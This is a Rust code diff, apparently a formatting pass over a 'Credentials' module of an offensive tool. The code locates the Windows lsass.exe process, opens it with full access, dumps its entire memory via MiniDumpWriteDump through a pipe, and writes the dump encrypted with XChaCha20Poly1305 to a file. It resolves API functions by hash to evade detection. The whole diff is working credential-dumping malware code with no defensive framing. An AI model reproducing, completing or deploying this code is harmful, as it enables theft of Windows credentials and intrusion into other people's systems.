@@ -30,25 +30,48 @@ impl Credentials {
             let load_library = resolve_function(kernel32, hash_str(b"LoadLibraryA"));
             let create_pipe = resolve_function(kernel32, hash_str(b"CreatePipe"));
             let create_thread = resolve_function(kernel32, hash_str(b"CreateThread"));
-            let wait_for_single_object = resolve_function(kernel32, hash_str(b"WaitForSingleObject"));
+            let wait_for_single_object =
+                resolve_function(kernel32, hash_str(b"WaitForSingleObject"));
 
-            if create_snapshot.is_null() || process_first.is_null() || open_process.is_null() || load_library.is_null() {
+            if create_snapshot.is_null()
+                || process_first.is_null()
+                || open_process.is_null()
+                || load_library.is_null()
+            {
                 return Err(());
             }
 
             type FnCreateSnapshot = unsafe extern "system" fn(u32, u32) -> HANDLE;
             type FnProcessNext = unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32) -> i32;
             type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> HANDLE;
-            type FnCreateFileA = unsafe extern "system" fn(*const u8, u32, u32, *mut c_void, u32, u32, HANDLE) -> HANDLE;
+            type FnCreateFileA = unsafe extern "system" fn(
+                *const u8,
+                u32,
+                u32,
+                *mut c_void,
+                u32,
+                u32,
+                HANDLE,
+            ) -> HANDLE;
             type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
             type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;
-            type FnCreatePipe = unsafe extern "system" fn(*mut HANDLE, *mut HANDLE, *mut c_void, u32) -> i32;
-            type FnCreateThread = unsafe extern "system" fn(*mut c_void, usize, unsafe extern "system" fn(PVOID) -> u32, PVOID, u32, *mut u32) -> HANDLE;
+            type FnCreatePipe =
+                unsafe extern "system" fn(*mut HANDLE, *mut HANDLE, *mut c_void, u32) -> i32;
+            type FnCreateThread = unsafe extern "system" fn(
+                *mut c_void,
+                usize,
+                unsafe extern "system" fn(PVOID) -> u32,
+                PVOID,
+                u32,
+                *mut u32,
+            ) -> HANDLE;
             type FnWaitForSingleObject = unsafe extern "system" fn(HANDLE, u32) -> u32;
 
             // 1. Find LSASS PID
             let h_snapshot = core::mem::transmute::<_, FnCreateSnapshot>(create_snapshot)(0x2, 0);
-            if h_snapshot == (-1isize as HANDLE) { return Err(()); }
+            if h_snapshot == (-1isize as HANDLE) {
+                return Err(());
+            }
 
             let mut pe: PROCESSENTRY32 = core::mem::zeroed();
             pe.dwSize = core::mem::size_of::<PROCESSENTRY32>() as u32;
@@ -60,7 +83,9 @@ impl Credentials {
                     let target = b"lsass.exe";
                     for i in 0..target.len() {
                         let mut c = pe.szExeFile[i];
-                        if c >= b'A' && c <= b'Z' { c += 32; }
+                        if c >= b'A' && c <= b'Z' {
+                            c += 32;
+                        }
                         if c != target[i] {
                             is_lsass = false;
                             break;
@@ -70,29 +95,37 @@ impl Credentials {
                         lsass_pid = pe.th32ProcessID;
                         break;
                     }
-                    if core::mem::transmute::<_, FnProcessNext>(process_next)(h_snapshot, &mut pe) == 0 {
+                    if core::mem::transmute::<_, FnProcessNext>(process_next)(h_snapshot, &mut pe)
+                        == 0
+                    {
                         break;
                     }
                 }
             }
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_snapshot);
 
-            if lsass_pid == 0 { return Err(()); }
+            if lsass_pid == 0 {
+                return Err(());
+            }
 
             // 2. Open LSASS
-            let h_process = core::mem::transmute::<_, FnOpenProcess>(open_process)(0x001F0FFF, 0, lsass_pid);
-            if h_process.is_null() { return Err(()); }
+            let h_process =
+                core::mem::transmute::<_, FnOpenProcess>(open_process)(0x001F0FFF, 0, lsass_pid);
+            if h_process.is_null() {
+                return Err(());
+            }
 
             // 3. Create Output File
-            let mut path_c = Vec::from(target_path.as_bytes()); path_c.push(0);
+            let mut path_c = Vec::from(target_path.as_bytes());
+            path_c.push(0);
             let h_file = core::mem::transmute::<_, FnCreateFileA>(create_file)(
                 path_c.as_ptr(),
                 0x40000000, // GENERIC_WRITE
                 0,
                 core::ptr::null_mut(),
-                2, // CREATE_ALWAYS
+                2,    // CREATE_ALWAYS
                 0x80, // FILE_ATTRIBUTE_NORMAL
-                core::ptr::null_mut()
+                core::ptr::null_mut(),
             );
 
             if h_file == (-1isize as HANDLE) {
@@ -103,7 +136,13 @@ impl Credentials {
             // 4. Create Pipe
             let mut h_read: HANDLE = core::ptr::null_mut();
             let mut h_write: HANDLE = core::ptr::null_mut();
-            if core::mem::transmute::<_, FnCreatePipe>(create_pipe)(&mut h_read, &mut h_write, core::ptr::null_mut(), 0) == 0 {
+            if core::mem::transmute::<_, FnCreatePipe>(create_pipe)(
+                &mut h_read,
+                &mut h_write,
+                core::ptr::null_mut(),
+                0,
+            ) == 0
+            {
                 core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_file);
                 core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);
                 return Err(());
@@ -126,7 +165,7 @@ impl Credentials {
                 encrypted_writer_thread,
                 Box::into_raw(ctx) as PVOID,
                 0,
-                core::ptr::null_mut()
+                core::ptr::null_mut(),
             );
 
             if h_thread.is_null() {
@@ -139,20 +178,23 @@ impl Credentials {
             }
 
             // 6. MiniDumpWriteDump
-            let h_dbghelp = core::mem::transmute::<_, FnLoadLibraryA>(load_library)(b"dbghelp.dll\0".as_ptr());
-            let minidump_write_dump_addr = resolve_function(hash_str(b"dbghelp.dll"), hash_str(b"MiniDumpWriteDump"));
-            
-            type FnMiniDumpWriteDump = unsafe extern "system" fn(HANDLE, u32, HANDLE, u32, PVOID, PVOID, PVOID) -> i32;
-            
+            let h_dbghelp =
+                core::mem::transmute::<_, FnLoadLibraryA>(load_library)(b"dbghelp.dll\0".as_ptr());
+            let minidump_write_dump_addr =
+                resolve_function(hash_str(b"dbghelp.dll"), hash_str(b"MiniDumpWriteDump"));
+
+            type FnMiniDumpWriteDump =
+                unsafe extern "system" fn(HANDLE, u32, HANDLE, u32, PVOID, PVOID, PVOID) -> i32;
+
             let success = if !minidump_write_dump_addr.is_null() {
                 core::mem::transmute::<_, FnMiniDumpWriteDump>(minidump_write_dump_addr)(
                     h_process,
                     lsass_pid,
-                    h_write, // Write to pipe
+                    h_write,    // Write to pipe
                     0x00000002, // MiniDumpWithFullMemory
                     core::ptr::null_mut(),
                     core::ptr::null_mut(),
-                    core::ptr::null_mut()
+                    core::ptr::null_mut(),
                 )
             } else {
                 0
@@ -162,8 +204,10 @@ impl Credentials {
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_write);
 
             // Wait for thread
-            core::mem::transmute::<_, FnWaitForSingleObject>(wait_for_single_object)(h_thread, 0xFFFFFFFF);
-            
+            core::mem::transmute::<_, FnWaitForSingleObject>(wait_for_single_object)(
+                h_thread, 0xFFFFFFFF,
+            );
+
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_thread);
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_file);
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);
@@ -171,7 +215,7 @@ impl Credentials {
             if success == 0 {
                 return Err(());
             }
-            
+
             Ok(sensitive_key)
         }
 
@@ -198,23 +242,37 @@ unsafe extern "system" fn encrypted_writer_thread(param: PVOID) -> u32 {
     let cipher = XChaCha20Poly1305::new(&ctx.key.into());
     let mut nonce_bytes = [0u8; 24];
     get_random_bytes(&mut nonce_bytes);
-    
+
     // Write Nonce to file header
     let mut written = 0;
-    core::mem::transmute::<_, FnWriteFile>(write_file)(ctx.h_file, nonce_bytes.as_ptr(), 24, &mut written, core::ptr::null_mut());
+    core::mem::transmute::<_, FnWriteFile>(write_file)(
+        ctx.h_file,
+        nonce_bytes.as_ptr(),
+        24,
+        &mut written,
+        core::ptr::null_mut(),
+    );
 
     let mut buf = [0u8; 65536]; // 64KB chunks
     let mut bytes_read = 0;
     let mut counter: u64 = 0;
 
     loop {
-        if core::mem::transmute::<_, FnReadFile>(read_file)(ctx.h_pipe, buf.as_mut_ptr() as PVOID, 65536, &mut bytes_read, core::ptr::null_mut()) == 0 || bytes_read == 0 {
+        if core::mem::transmute::<_, FnReadFile>(read_file)(
+            ctx.h_pipe,
+            buf.as_mut_ptr() as PVOID,
+            65536,
+            &mut bytes_read,
+            core::ptr::null_mut(),
+        ) == 0
+            || bytes_read == 0
+        {
             break;
         }
 
         // Encrypt chunk
         // Use nonce + counter for chunk uniqueness?
-        // XChaCha20Poly1305 nonce is 24 bytes. 
+        // XChaCha20Poly1305 nonce is 24 bytes.
         // We can increment the last 8 bytes of nonce for each chunk to avoid nonce reuse with same key?
         // Or just re-encrypt each chunk as independent message?
         // "Stream encryption"
@@ -231,8 +289,20 @@ unsafe extern "system" fn encrypted_writer_thread(param: PVOID) -> u32 {
             // Write: [Len(4)][Ciphertext]
             // We need to write length because tag adds bytes (16).
             let len = ciphertext.len() as u32;
-            core::mem::transmute::<_, FnWriteFile>(write_file)(ctx.h_file, &len as *const u32 as *const u8, 4, &mut written, core::ptr::null_mut());
-            core::mem::transmute::<_, FnWriteFile>(write_file)(ctx.h_file, ciphertext.as_ptr(), ciphertext.len() as u32, &mut written, core::ptr::null_mut());
+            core::mem::transmute::<_, FnWriteFile>(write_file)(
+                ctx.h_file,
+                &len as *const u32 as *const u8,
+                4,
+                &mut written,
+                core::ptr::null_mut(),
+            );
+            core::mem::transmute::<_, FnWriteFile>(write_file)(
+                ctx.h_file,
+                ciphertext.as_ptr(),
+                ciphertext.len() as u32,
+                &mut written,
+                core::ptr::null_mut(),
+            );
         }
     }
 
